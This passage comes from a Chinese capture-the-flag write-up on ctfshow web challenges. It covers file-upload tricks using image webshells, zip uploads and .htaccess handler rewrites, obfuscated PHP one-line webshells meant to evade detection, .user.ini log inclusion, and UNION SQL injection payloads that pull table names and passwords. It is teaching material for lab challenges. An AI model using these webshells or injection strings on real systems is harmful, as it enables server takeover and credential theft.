<span class="line"><span style="color:#d4d4d4">                </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(!</span><span style="color:#dcdcaa">file_exists</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$filename</span><span style="color:#d4d4d4">) || !</span><span style="color:#dcdcaa">is_file</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$filename</span><span style="color:#d4d4d4">))</span></span>
<span class="line"><span style="color:#d4d4d4">                    </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'File not exists ['</span><span style="color:#d4d4d4">.</span><span style="color:#9cdcfe">$filename</span><span style="color:#d4d4d4">.</span><span style="color:#ce9178">']'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">                </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">binData</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">file_get_contents</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$filename</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">            } </span><span style="color:#c586c0">else</span><span style="color:#d4d4d4"> {</span></span>
<span class="line"><span style="color:#d4d4d4">                </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">binData</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$filename</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">            }</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">size</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">strlen</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">binData</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">seek</span><span style="color:#d4d4d4">() {</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> (</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">size</span><span style="color:#d4d4d4"> - </span><span style="color:#dcdcaa">strlen</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">binData</span><span style="color:#d4d4d4">));</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">skip</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$skip</span><span style="color:#d4d4d4">) {</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">binData</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">substr</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">binData</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$skip</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">readByte</span><span style="color:#d4d4d4">() {</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#dcdcaa">eof</span><span style="color:#d4d4d4">()) {</span></span>
<span class="line"><span style="color:#d4d4d4">                </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'End Of File'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">            }</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#9cdcfe">$byte</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">substr</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">binData</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">binData</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">substr</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">binData</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">ord</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$byte</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">readShort</span><span style="color:#d4d4d4">() {</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">strlen</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">binData</span><span style="color:#d4d4d4">) &lt; </span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">) {</span></span>
<span class="line"><span style="color:#d4d4d4">                </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'End Of File'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">            }</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#9cdcfe">$short</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">substr</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">binData</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">binData</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">substr</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">binData</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">order</span><span style="color:#d4d4d4">) {</span></span>
<span class="line"><span style="color:#d4d4d4">                </span><span style="color:#9cdcfe">$short</span><span style="color:#d4d4d4"> = (</span><span style="color:#dcdcaa">ord</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$short</span><span style="color:#d4d4d4">[</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">]) &lt;&lt; </span><span style="color:#b5cea8">8</span><span style="color:#d4d4d4">) + </span><span style="color:#dcdcaa">ord</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$short</span><span style="color:#d4d4d4">[</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">]);</span></span>
<span class="line"><span style="color:#d4d4d4">            } </span><span style="color:#c586c0">else</span><span style="color:#d4d4d4"> {</span></span>
<span class="line"><span style="color:#d4d4d4">                </span><span style="color:#9cdcfe">$short</span><span style="color:#d4d4d4"> = (</span><span style="color:#dcdcaa">ord</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$short</span><span style="color:#d4d4d4">[</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">]) &lt;&lt; </span><span style="color:#b5cea8">8</span><span style="color:#d4d4d4">) + </span><span style="color:#dcdcaa">ord</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$short</span><span style="color:#d4d4d4">[</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">]);</span></span>
<span class="line"><span style="color:#d4d4d4">            }</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$short</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">eof</span><span style="color:#d4d4d4">() {</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> !</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">binData</span><span style="color:#d4d4d4">||(</span><span style="color:#dcdcaa">strlen</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">binData</span><span style="color:#d4d4d4">) === </span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span>
<span class="line"><span style="color:#6a9955"># 用法  php exp.php a.png</span></span></code></pre></div></div></figure><p>注意这个开头的写马的 php 语句，可以大大提高成功率，不要随意改动</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301171447787.png" srcset="/img/loading/loading.gif" lazyload alt="image-20230117144713701"></p><p>首先上传一张图片</p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301171452978.jpg" srcset="/img/loading/loading.gif" lazyload alt="1" style="zoom:33%"><p>然后访问下载下来被二次渲染过的图，保存为 jpg 格式。</p><p>确保该图片和脚本文件在同一目录下，使用命令行</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">php test</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">php qq</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">jpg</span></span>
<span class="line"><span style="color:#6a9955"># 仅作格式演示</span></span></code></pre></div></div></figure><p>显示 Success 说明生成成功，在该目录下会得到 payload 文件。</p><p>之后上传上去，抓包执行命令即可。<strong>注意更改请求方法为 post！</strong></p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301171451197.png" srcset="/img/loading/loading.gif" lazyload alt="image-20230117145129103"></p><p>需要注意的是，jpg 图片马制作很容易失败无法执行（不是本身容易失败而是制作好了了，但是不一定有用），需要多试试不同的图片。</p><h3 id="web166zip写马"><a class="markdownIt-Anchor" href="#web166zip写马"></a> web166（zip 写马）</h3><p>查看源代码可知只能是 zip 文件</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301071521179.png" srcset="/img/loading/loading.gif" lazyload alt="image-20230107152134050"></p><p>那么直接写一句话然后正常上传，之后开启抓包点击下载文件，在重发器中拿 flag。</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301071529081.png" srcset="/img/loading/loading.gif" lazyload alt="image-20230107152905949"></p><p>记得修改请求方式为 post。</p><h3 id="web167htaccess"><a class="markdownIt-Anchor" href="#web167htaccess"></a> web167（.htaccess）</h3><p>hint：httpd</p><p>提示已经告诉了我们方向，尝试之后发现是 htaccess</p><p>于是重写解析规则：</p><p>法 1</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">AddType application/x-httpd-php </span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">png</span></span>
<span class="line"><span style="color:#6a9955"># 将.png后缀的文件解析 成php</span></span></code></pre></div></div></figure><p>法 2</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;FilesMatch </span><span style="color:#ce9178">"png"</span><span style="color:#d4d4d4">&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">SetHandler application/x-httpd-php</span></span>
<span class="line"><span style="color:#d4d4d4">&lt;/FilesMatch&gt;</span></span>
<span class="line"><span style="color:#6a9955"># 带png的解析成php</span></span></code></pre></div></div></figure><p>上传好.htaccess 文件之后然后正常上传带马图片拿 flag。<img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301071547168.png" srcset="/img/loading/loading.gif" lazyload alt="image-20230107154745061"></p><h3 id="web168-170免杀"><a class="markdownIt-Anchor" href="#web168-170免杀"></a> web168-170（免杀）</h3><p>一些免杀姿势：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"><span style="color:#9cdcfe">$a</span><span style="color:#d4d4d4"> = </span><span style="color:#ce9178">"s#y#s#t#e#m"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#9cdcfe">$b</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">explode</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"#"</span><span style="color:#d4d4d4">,</span><span style="color:#9cdcfe">$a</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#9cdcfe">$c</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$b</span><span style="color:#d4d4d4">[</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">]</span><span style="color:#d4d4d4">.</span><span style="color:#9cdcfe">$b</span><span style="color:#d4d4d4">[</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">]</span><span style="color:#d4d4d4">.</span><span style="color:#9cdcfe">$b</span><span style="color:#d4d4d4">[</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">]</span><span style="color:#d4d4d4">.</span><span style="color:#9cdcfe">$b</span><span style="color:#d4d4d4">[</span><span style="color:#b5cea8">3</span><span style="color:#d4d4d4">]</span><span style="color:#d4d4d4">.</span><span style="color:#9cdcfe">$b</span><span style="color:#d4d4d4">[</span><span style="color:#b5cea8">4</span><span style="color:#d4d4d4">]</span><span style="color:#d4d4d4">.</span><span style="color:#9cdcfe">$b</span><span style="color:#d4d4d4">[</span><span style="color:#b5cea8">5</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#9cdcfe">$c</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_REQUEST</span><span style="color:#d4d4d4">[</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">]);</span></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span></code></pre></div></div></figure><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"><span style="color:#9cdcfe">$a</span><span style="color:#d4d4d4">=</span><span style="color:#dcdcaa">substr</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'1s'</span><span style="color:#d4d4d4">,</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">)</span><span style="color:#d4d4d4">.</span><span style="color:#ce9178">'ystem'</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#9cdcfe">$a</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_REQUEST</span><span style="color:#d4d4d4">[</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">]);</span></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span></code></pre></div></div></figure><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"><span style="color:#9cdcfe">$a</span><span style="color:#d4d4d4">=</span><span style="color:#dcdcaa">strrev</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'metsys'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#9cdcfe">$a</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_REQUEST</span><span style="color:#d4d4d4">[</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">]);</span></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span></code></pre></div></div></figure><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"><span style="color:#9cdcfe">$a</span><span style="color:#d4d4d4">=</span><span style="color:#9cdcfe">$_REQUEST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'a'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#9cdcfe">$b</span><span style="color:#d4d4d4">=</span><span style="color:#9cdcfe">$_REQUEST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'b'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#9cdcfe">$a</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$b</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span></code></pre></div></div></figure><p>168 题的话，也可以直接使用</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?=</span><span style="color:#ce9178">`tac ../f*`</span><span style="color:#d4d4d4">?&gt;</span></span></code></pre></div></div></figure><p>不出意外是拿到一个假 flag。真的改文件名了</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301071558831.png" srcset="/img/loading/loading.gif" lazyload alt="image-20230107155846718"></p><figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?=`tac ../flagaa.php`?&gt;</span></span></code></pre></div></div></figure><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301071559235.png" srcset="/img/loading/loading.gif" lazyload alt="image-20230107155925129" style="zoom:200%"><p>169 170 用日志包含</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#6a9955"># .user.ini</span></span>
<span class="line"><span style="color:#d4d4d4">auto_append_file=</span><span style="color:#ce9178">"/var/log/nginx/access.log"</span></span></code></pre></div></div></figure><h2 id="sql注入"><a class="markdownIt-Anchor" href="#sql注入"></a> sql 注入</h2><h3 id="有回显的单引号包含"><a class="markdownIt-Anchor" href="#有回显的单引号包含"></a> 有回显的单引号包含</h3><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#6a9955">//拼接sql语句查找指定ID用户</span></span>
<span class="line"><span style="color:#9cdcfe">$sql</span><span style="color:#d4d4d4"> = </span><span style="color:#ce9178">"select username,password from user where username !='flag' and id = '"</span><span style="color:#d4d4d4">.</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'id'</span><span style="color:#d4d4d4">]</span><span style="color:#d4d4d4">.</span><span style="color:#ce9178">"' limit 1;"</span><span style="color:#d4d4d4">;</span></span></code></pre></div></div></figure><p>最重要的还是最后一句</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">and id = </span><span style="color:#ce9178">'".$_GET['</span><span style="color:#d4d4d4">id</span><span style="color:#ce9178">']."'</span><span style="color:#d4d4d4"> limit </span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">;</span><span style="color:#ce9178">";</span></span></code></pre></div></div></figure><p>这里简单的单引号包括变量 id 很容易出现注入：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#6a9955"># get传: </span></span>
<span class="line"><span style="color:#d4d4d4">id = </span><span style="color:#b5cea8">1</span><span style="color:#ce9178">' order by 4 --+</span></span></code></pre></div></div></figure><p>这一句中的</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">--+</span></span></code></pre></div></div></figure><p>是起一个注释截止的作用。因为单引号在包含的时候，由于我们闭合了最开始的那个单引号，那么后面有个单引号就没有被闭合，这里用 --+ （-- 是注释，+ 相当于一个空格）这样就能让后面单引号被注释。还有别的注释符号：#</p><p>而这一句本身的作用可以说是判断列数，一般列数都是 3 列这样子，可以一个个试。</p><p>然后就可以搜查数据库名字了：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">-</span><span style="color:#b5cea8">1</span><span style="color:#ce9178">' union select 1,2,database() --+</span></span></code></pre></div></div></figure><p>假设搜查到的数据库为：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#6a9955"># database：</span></span>
<span class="line"><span style="color:#d4d4d4">ctf_web</span></span></code></pre></div></div></figure><p>构造语句搜查数据库中的表：</p><figure class="shiki sql"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">-</span><span style="color:#b5cea8">1</span><span style="color:#ce9178">' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='</span><span style="color:#d4d4d4">ctf_web</span><span style="color:#ce9178">' --+</span></span></code></pre></div></div></figure><p>假设得到的表名：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#6a9955"># table_name：</span></span>
<span class="line"><span style="color:#d4d4d4">ctf_user</span></span></code></pre></div></div></figure><p>构造语句查看字段：</p><figure class="shiki sql"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">-</span><span style="color:#b5cea8">1</span><span style="color:#ce9178">' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='</span><span style="color:#d4d4d4">ctf_user</span><span style="color:#ce9178">' --+</span></span></code></pre></div></div></figure><p>假设得到字段：</p><figure class="shiki sql"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">id,username,</span><span style="color:#569cd6">password</span></span></code></pre></div></div></figure><p>查看字段值：</p><figure class="shiki sql"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">-</span><span style="color:#b5cea8">1</span><span style="color:#ce9178">' union select 1,2,group_concat(password) from ctfshow_web.ctfshow_user --+</span></span></code></pre></div></div></figure><p>一般到这一步就能得到 flag 了。</p><p>这里用的到语句中有几个函数或者说方法需要注意一下：</p><figure class="shiki sql"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">group_concat 可以将所有的tables 提取出来</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">information_schema 是mysql特有的库，存储各种数据库的信息</span></span></code></pre></div></div></figure><h3 id="web171-173单引号包括"><a class="markdownIt-Anchor" href="#web171-173单引号包括"></a> web171-173（单引号包括）</h3><p>判断列数</p><figure class="shiki sql"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#b5cea8">1</span><span style="color:#ce9178">' order by 3 --+</span></span></code></pre></div></div></figure><p>之后常规查数据库名：</p><figure class="shiki sql"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#b5cea8">1</span><span style="color:#ce9178">' union select 1,2,database() --+</span></span></code></pre></div></div></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301131601208.png" srcset="/img/loading/loading.gif" lazyload alt="image-20230113160153101"></p><p>查看库中表名：</p><figure class="shiki sql"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">-</span><span style="color:#b5cea8">1</span><span style="color:#ce9178">' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='</span><span style="color:#d4d4d4">ctfshow_web</span><span style="color:#ce9178">' --+</span></span></code></pre></div></div></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301131604868.png" srcset="/img/loading/loading.gif" lazyload alt="image-20230113160439767"></p><p>查看表中字段：</p><figure class="shiki sql"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">-</span><span style="color:#b5cea8">1</span><span style="color:#ce9178">' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='</span><span style="color:#d4d4d4">ctfshow_user</span><span style="color:#ce9178">' --+</span></span></code></pre></div></div></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202301131605366.png" srcset="/img/loading/loading.gif" lazyload alt="image-20230113160524275"></p><p>查看字段值：</p><figure class="shiki sql"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">-</span><span style="color:#b5cea8">1</span><span style="color:#ce9178">' union select 1,2,group_concat(password) from ctfshow_web.ctfshow_user --+</span></span></code></pre></div></div></figure><p>得到 flag。</p><h3 id="web174数字过滤replac盲注"><a class="markdownIt-Anchor" href="#web174数字过滤replac盲注"></a> web174（数字过滤 replac / 盲注）</h3><p>查询语句</p><figure class="shiki sql"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">//拼接sql语句查找指定ID用户</span></span>
<span class="line"><span style="color:#d4d4d4">$</span><span style="color:#569cd6">sql</span><span style="color:#d4d4d4"> = </span><span style="color:#ce9178">"select id,username,password from ctfshow_user2 where username !='flag' and id = '"</span><span style="color:#d4d4d4">.$_GET['id'].</span><span style="color:#ce9178">"' limit 1;"</span><span style="color:#d4d4d4">;</span></span></code></pre></div></div></figure><p>返回逻辑</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#6a9955">//检查结果是否有flag</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(!</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">'/flag/i'</span><span style="color:#d4d4d4">, </span><span style="color:#dcdcaa">json_encode</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$ret</span><span style="color:#d4d4d4">))){</span></span>
